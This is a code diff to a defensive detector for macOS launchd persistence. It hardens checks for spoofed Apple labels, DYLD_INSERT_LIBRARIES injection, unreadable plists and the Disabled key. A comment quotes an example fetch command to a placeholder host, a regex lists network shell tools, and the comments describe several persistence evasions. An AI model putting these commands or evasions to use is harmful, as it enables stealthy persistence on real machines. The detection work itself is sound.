@@ -52,6 +52,16 @@ const MAC_TRANSIENT_ARG_RE =
 /** Where Apple's own launchd programs live. */
 const APPLE_PROGRAM_RE = /^\/(?:System\/|usr\/(?:libexec|sbin|bin|lib)\/|Library\/Apple\/)/;
 
+/**
+ * Apple SHIPS these, and macOS persistence almost always drives one of them.
+ *
+ * Treating any /usr/bin path as "Apple's own program" let a job labelled com.apple.updated run
+ * `/usr/bin/curl http://evil.test/x` with no finding at all. Being shipped by Apple is not the
+ * same as being an Apple SERVICE, and these are the ones an operator reaches for.
+ */
+const APPLE_SHIPPED_TOOL_RE =
+  /\/(?:curl|python[\d.]*|perl|ruby|php|osascript|open|nc|ncat|socat|ssh|scp|sftp|screen|tclsh|expect|env|xargs|bash|sh|zsh|ksh|csh|tcsh|awk|sed|defaults|launchctl|security|softwareupdate|automator|caffeinate)$/;
+
 /** Ordinary hidden directories on a Mac. A payload under one of these is not remarkable for hiding. */
 const ORDINARY_HIDDEN = new Set([
   ".config",
@@ -117,6 +127,9 @@ export function claimsApple(label: string): boolean {
 export function misleadingLabel(job: LaunchJob, scope: LaunchScope): boolean {
   if (!claimsApple(job.label)) return false;
   if (scope === "apple") return false;
+  // An interpreter or transfer tool is shipped by Apple but is not an Apple service, so its path
+  // does not vouch for a com.apple.* label the way /usr/libexec/softwareupdated does.
+  if (APPLE_SHIPPED_TOOL_RE.test(job.program)) return true;
   return !APPLE_PROGRAM_RE.test(job.program);
 }
 
@@ -140,10 +153,16 @@ export interface MacJudgement {
 
 export function judgeJob(job: LaunchJob, scope: LaunchScope): MacJudgement {
   // The Linux payload grader reads the command text; the path rules are macOS's own.
-  const j = judgePayload(job.commandLine);
+  //
+  // EnvironmentVariables is read as part of both. DYLD_INSERT_LIBRARIES is macOS persistence in one
+  // key — the program can be entirely legitimate while the library loaded into it is not — and
+  // reading only the command line missed it completely.
+  const env = Object.values(job.environment).join(" ");
+  const text = `${job.commandLine} ${env}`.trim();
+  const j = judgePayload(text);
   return {
-    transient: MAC_TRANSIENT_RE.test(job.program) || MAC_TRANSIENT_ARG_RE.test(job.commandLine),
-    hiddenPath: hidden(job.program),
+    transient: MAC_TRANSIENT_RE.test(job.program) || MAC_TRANSIENT_ARG_RE.test(text),
+    hiddenPath: hidden(job.program) || Object.values(job.environment).some(hidden),
     fetchExec: j.fetchExec,
     reverseShell: j.reverseShell,
     encoded: j.encoded,
@@ -186,35 +205,61 @@ const MITRE_BY_SCOPE: Record<LaunchScope, string> = {
  * reasons, not several findings. Counting them separately would inflate the panel and imply
  * independent evidence where there is one file.
  */
+/** A finding that says the file could not be read, rather than saying nothing. */
+function unreadable(file: CollectedFile, reason: string): LinuxSignal {
+  return {
+    artifact: file.path,
+    kind: "launchd",
+    severity: "Medium",
+    mitre: [],
+    reason,
+    evidence: clip(file.content.slice(0, 120)),
+    line: 1,
+    timeUnknown: !file.mtime,
+  };
+}
+
 export function gradeLaunchd(file: CollectedFile, ctx: MacContext = {}): LinuxSignal[] {
   if (isBinaryPlist(file.content)) {
     return [
-      {
-        artifact: file.path,
-        kind: "launchd",
-        severity: "Medium",
-        mitre: [],
-        reason:
-          "This launchd plist is in the binary format, which is not text and was not read. Nothing about it has been assessed either way. Convert it and re-import: plutil -convert xml1 -o - <file>.",
-        evidence: "bplist00…",
-        line: 1,
-        timeUnknown: !file.mtime,
-      },
+      unreadable(
+        file,
+        "This launchd plist is in the binary format, which is not text and was not read. Nothing about it has been assessed either way. Convert it and re-import: plutil -convert xml1 -o - <file>.",
+      ),
     ];
   }
 
   const plist = parsePlist(file.content);
-  if (!plist) return [];
-  const job = readLaunchJob(plist);
-  if (!job.program) return [];
+  const job = plist ? readLaunchJob(plist) : null;
+
+  // A PLIST THAT YIELDS NO PROGRAM MUST SAY SO. Returning nothing made "I could not read this file"
+  // indistinguishable from "this file is clean" — a truncated member of a real collection, and a
+  // crafted one, both produced "1 artifact file(s) read, 0 finding(s)". The binary-plist branch
+  // above already got this right; the XML branch did not.
+  if (!plist || !job?.program) {
+    return [
+      unreadable(
+        file,
+        plist
+          ? "This launchd plist parsed, but it names no program to run — either it is not a job, or the file is truncated or malformed. Nothing about it has been assessed either way; read the raw file."
+          : "This launchd plist could not be parsed as a property list. Nothing about it has been assessed either way; read the raw file, or convert it with plutil -convert xml1.",
+      ),
+    ];
+  }
+
   if ((ctx.knownLabels ?? []).includes(job.label)) return [];
-  if (job.disabled) return [];
 
   const scope = launchScope(file.path);
   const m = judgeJob(job, scope);
   if (!standsAlone(m) && !m.hiddenPath) return [];
 
   let severity: Severity = standsAlone(m) ? "High" : "Medium";
+  // Disabled is only the plist's DEFAULT. `launchctl load -w` overrides it in
+  // /var/db/com.apple.xpc.launchd/disabled.plist and the job runs. Dropping the job on this key
+  // was a one-line evasion, and a disabled persistence plist is evidence either way.
+  if (job.disabled) {
+    if (RANK[severity] > RANK.Medium) severity = "Medium";
+  }
   let reason = primaryReason(m, job, scope);
 
   // Everything below EXPLAINS or RAISES. None of it can produce a finding on its own.
@@ -227,6 +272,10 @@ export function gradeLaunchd(file: CollectedFile, ctx: MacContext = {}): LinuxSi
     reason += ` It re-runs every ${job.startInterval} second(s).`;
   }
   if (job.watchPaths.length) reason += ` It also runs whenever ${job.watchPaths[0]} changes.`;
+  if (job.disabled) {
+    reason +=
+      " The plist sets Disabled, which is only the default — `launchctl load -w` overrides it, so this may still be loaded. Check /var/db/com.apple.xpc.launchd/disabled.plist.";
+  }
 
   // The annotation sits on the plist, because the plist is the file the analyst collected — so the
   // file's own `extra` is read first. ctx.facts stays as the route for a collection that recorded
